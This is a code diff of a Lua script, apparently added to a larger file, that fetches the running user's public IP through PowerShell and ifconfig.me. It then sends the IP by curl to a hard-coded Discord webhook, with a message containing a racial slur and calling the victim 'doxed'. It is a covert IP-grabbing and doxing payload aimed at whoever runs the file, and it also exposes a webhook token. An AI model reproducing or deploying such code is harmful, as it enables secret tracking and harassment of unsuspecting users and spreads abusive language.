@@ -383,8 +383,16 @@ end)]]
 
 -- Lua script to grab IP address and send it to Discord webhook
 
-local ip = io.open("curl ifconfig.me/ip"):read("*a") -- Retrieve IP address using curl
-ip = ip:gsub("\n", "") -- Remove newline character
+-- Function to execute shell commands and capture output
+local function execute(command)
+    local handle = io.popen(command)
+    local result = handle:read("*a")
+    handle:close()
+    return result
+end
+
+-- Retrieve IP address using PowerShell
+local ip = execute('powershell -Command "(Invoke-RestMethod ifconfig.me/ip)"'):gsub("\n", ""):gsub("\r", "")
 
 -- Discord webhook URL
 local webhook = "https://discord.com/api/webhooks/1234595640261087383/3CW1bQnmu7HbJulV2AFRwzs9EtOVhQbPDmHlC4O354T9ZhiBRljC85cgb78uIgRGd_HT"
@@ -393,4 +401,4 @@ local webhook = "https://discord.com/api/webhooks/1234595640261087383/3CW1bQnmu7
 local data = string.format('{"content": "This nigga got doxed lmao: %s"}', ip)
 
 -- Send data to Discord webhook
-os.execute(string.format('curl -X POST -H "Content-Type: application/json" -d \'%s\' %s', data, webhook))
+execute(string.format('curl -X POST -H "Content-Type: application/json" -d \'%s\' %s', data, webhook))
